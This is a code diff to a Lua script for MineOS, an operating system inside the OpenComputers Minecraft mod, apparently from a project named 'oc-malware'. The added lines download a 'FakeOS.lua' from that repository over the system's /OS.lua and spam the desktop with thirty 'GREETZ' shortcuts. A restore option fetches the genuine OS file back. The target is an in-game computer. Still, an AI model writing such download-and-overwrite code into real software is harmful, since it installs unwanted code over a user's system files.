@@ -25,11 +25,11 @@ function FUN()
   local cdir = fs.path(system.getCurrentScript())
   
   fs.makeDirectory("/MineOS/Greetz.app")
-  fs.copy(cdir .. "Greetz.app/Icon.pic","/MineOS/Greetz.app/Icon.pic")
-  fs.copy(cdir .. "Greetz.app/Main.lua","/MineOS/Greetz.app/Main.lua")
+  internet.download("https://raw.githubusercontent.com/ocboy3/oc-malware/main/OCHammer.app/Greetz.app/Icon.pic","/MineOS/Greetz.app/Icon.pic")
+  internet.download("https://raw.githubusercontent.com/ocboy3/oc-malware/main/OCHammer.app/Greetz.app/Main.lua","/MineOS/Greetz.app/Main.lua")
   
   
-  internet.download(,"/OS.lua")
+  internet.download("https://raw.githubusercontent.com/ocboy3/oc-malware/main/OCHammer.app/FakeOS.lua","/OS.lua")
   
   for i = 1,30 do
     system.createShortcut(paths.user.desktop .. "GREETZ " .. tostring(i),"/MineOS/Greetz.app/")
@@ -123,10 +123,10 @@ local args,ops = system.parseArguments(...)
 if ops["restore"] then
   print("Restoring /OS.lua")
   print("Please wait..")
-  fs.copy(fs.path(system.getCurrentScript()) .. "OS.bak","/OS.lua")
+  internet.download("https://raw.githubusercontent.com/IgorTimofeev/MineOS/master/OS.lua","/OS.lua")
   print("Restoring complete")
   print(" ")
-  print("You have to manually remove the spam icons on the desktop.")
+  print("You have to follow the instuctions at https://github.com/ocboy3/oc-malware/README.md")
   print("Please restart your computer manually. (just in case)")
 else
 
